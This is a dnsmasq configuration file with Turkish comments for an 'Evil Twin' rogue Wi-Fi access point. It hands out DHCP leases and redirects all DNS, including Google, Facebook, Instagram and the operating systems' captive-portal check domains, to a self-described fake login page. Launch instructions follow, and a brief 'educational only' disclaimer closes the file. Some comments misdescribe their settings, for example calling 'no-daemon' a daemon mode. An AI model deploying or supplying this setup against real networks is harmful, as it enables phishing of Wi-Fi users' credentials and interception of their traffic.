# Evil Twin Saldırısı - Dnsmasq Yapılandırma Dosyası
# Bu dosya DHCP ve DNS sunucu ayarlarını içerir

# ============================================================================
# TEMEL AYARLAR
# ============================================================================

# Arayüz ayarları - sadece belirtilen arayüzde çalış
interface=wlan0

# Diğer arayüzleri dinleme
bind-interfaces

# Daemon olarak çalış
no-daemon

# PID dosyası
pid-file=/var/run/dnsmasq.pid

# ============================================================================
# DHCP SUNUCU AYARLARI
# ============================================================================

# DHCP aralığı ve kira süresi
# Syntax: dhcp-range=[tag:tag,]start,end,netmask,lease-time
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h

# DHCP seçenekleri
# Option 3: Router (Gateway)
dhcp-option=3,192.168.1.1

# Option 6: DNS Sunucuları
dhcp-option=6,192.168.1.1,8.8.8.8

# Option 1: Subnet Mask
dhcp-option=1,255.255.255.0

# Option 28: Broadcast Address
dhcp-option=28,192.168.1.255

# DHCP sunucusunun IP adresi
listen-address=192.168.1.1

# DHCP yetkili sunucu
dhcp-authoritative

# Hızlı DHCP yanıtları
dhcp-rapid-commit

# ============================================================================
# DNS SUNUCU AYARLARI
# ============================================================================

# Upstream DNS sunucuları (gerçek DNS sorguları için)
server=8.8.8.8
server=8.8.4.4
server=1.1.1.1
server=1.0.0.1

# DNS cache boyutu
cache-size=1000

# DNS TTL değeri
local-ttl=300

# ============================================================================
# CAPTIVE PORTAL AYARLARI
# ============================================================================

# Tüm DNS sorgularını kendi IP'mize yönlendir (Captive Portal için)
# Bu ayar tüm web sitelerini sahte giriş sayfamıza yönlendirir
address=/#/192.168.1.1

# Yaygın captive portal test domainleri
address=/captive.apple.com/192.168.1.1
address=/connectivitycheck.gstatic.com/192.168.1.1
address=/detectportal.firefox.com/192.168.1.1
address=/nmcheck.gnome.org/192.168.1.1
address=/network-test.debian.org/192.168.1.1
address=/connectivity-check.ubuntu.com/192.168.1.1

# Popüler web siteleri (test için)
address=/google.com/192.168.1.1
address=/facebook.com/192.168.1.1
address=/youtube.com/192.168.1.1
address=/instagram.com/192.168.1.1
address=/twitter.com/192.168.1.1
address=/linkedin.com/192.168.1.1

# ============================================================================
# LOG AYARLARI
# ============================================================================

# Log dosyası
log-facility=/var/log/evil-twin/dnsmasq.log

# DHCP logları
log-dhcp

# DNS sorgu logları (debug için)
# log-queries

# Async log yazma
log-async

# ============================================================================
# GÜVENLİK AYARLARI
# ============================================================================

# DNS rebinding saldırılarını engelle
stop-dns-rebind

# Özel IP aralıklarına DNS sorgularını engelle
rebind-localhost-ok

# Bogus private reverse lookups
bogus-priv

# Domain isimlerini genişletme
expand-hosts

# Local domain
domain=evil-twin.local

# ============================================================================
# PERFORMANS AYARLARI
# ============================================================================

# Negatif cache TTL
neg-ttl=60

# DNS cache temizleme
clear-on-reload

# Strict order (DNS sunucularını sırayla dene)
strict-order

# ============================================================================
# DHCP REZERVASYONLARI (İsteğe bağlı)
# ============================================================================

# Belirli MAC adreslerine sabit IP atama
# dhcp-host=aa:bb:cc:dd:ee:ff,192.168.1.50,laptop
# dhcp-host=11:22:33:44:55:66,192.168.1.51,phone

# ============================================================================
# CAPTIVE PORTAL GELIŞMIŞ AYARLARI
# ============================================================================

# HTTP yönlendirme için ek ayarlar
# Bu ayarlar kullanıcıları otomatik olarak giriş sayfasına yönlendirir

# Microsoft Windows captive portal tespiti
address=/msftconnecttest.com/192.168.1.1
address=/msftncsi.com/192.168.1.1

# Android captive portal tespiti
address=/clients3.google.com/192.168.1.1
address=/play.googleapis.com/192.168.1.1

# ============================================================================
# ÖZEL DOMAIN AYARLARI
# ============================================================================

# Evil Twin için özel domain
address=/evil-twin.local/192.168.1.1
address=/login.evil-twin.local/192.168.1.1
address=/portal.evil-twin.local/192.168.1.1

# ============================================================================
# DHCP SEÇENEK AYARLARI
# ============================================================================

# Vendor class identifier
dhcp-option=vendor:MSFT,2,1i

# NTP sunucuları
dhcp-option=42,192.168.1.1

# Domain name
dhcp-option=15,evil-twin.local

# ============================================================================
# GELIŞMIŞ AYARLAR
# ============================================================================

# DHCP script (IP atandığında çalışacak script)
# dhcp-script=/usr/local/bin/dhcp-event.sh

# TFTP sunucu (PXE boot için)
# enable-tftp
# tftp-root=/var/lib/tftpboot

# ============================================================================
# ÖRNEK YAPILANDIRMALAR
# ============================================================================

# ÖRNEK 1: Basit Evil Twin
# interface=wlan0
# dhcp-range=192.168.1.10,192.168.1.100,12h
# address=/#/192.168.1.1

# ÖRNEK 2: Gelişmiş Captive Portal
# interface=wlan0
# dhcp-range=10.0.0.10,10.0.0.100,24h
# dhcp-option=3,10.0.0.1
# dhcp-option=6,10.0.0.1
# address=/#/10.0.0.1
# log-dhcp
# log-queries

# ÖRNEK 3: Kurumsal Ağ Simülasyonu
# interface=wlan0
# dhcp-range=172.16.1.10,172.16.1.200,8h
# dhcp-option=3,172.16.1.1
# dhcp-option=6,172.16.1.1,172.16.1.2
# domain=company.local
# address=/company.local/172.16.1.1

# ============================================================================
# KULLANIM TALİMATLARI
# ============================================================================

# 1. Bu dosyayı ihtiyacınıza göre düzenleyin:
#    - interface: Kablosuz arayüz adını güncelleyin
#    - dhcp-range: IP aralığını ayarlayın
#    - listen-address: Gateway IP'sini ayarlayın

# 2. Dnsmasq'ı başlatın:
#    sudo dnsmasq -C /path/to/this/dnsmasq.conf

# 3. Arayüze IP adresi atayın:
#    sudo ip addr add 192.168.1.1/24 dev wlan0

# 4. IP forwarding'i aktifleştirin:
#    sudo sysctl net.ipv4.ip_forward=1

# ============================================================================
# SORUN GİDERME
# ============================================================================

# Dnsmasq başlamazsa:
# 1. Port 53'ün kullanımda olup olmadığını kontrol edin
# 2. Arayüzün aktif olduğunu kontrol edin
# 3. İzinleri kontrol edin
# 4. Log dosyalarını inceleyin

# Yaygın hatalar:
# - "Address already in use": Port 53 başka servis tarafından kullanılıyor
# - "No such device": Arayüz adı yanlış
# - "Permission denied": Root yetkisi gerekli

# Debug için:
# sudo dnsmasq -C /path/to/this/dnsmasq.conf -d -q

# ============================================================================
# GÜVENLİK UYARILARI
# ============================================================================

# ⚠️ Bu yapılandırma yalnızca eğitim amaçlıdır
# ⚠️ Gerçek ağlarda kullanmayın
# ⚠️ Kişisel verileri koruyun
# ⚠️ Yasal kurallara uyun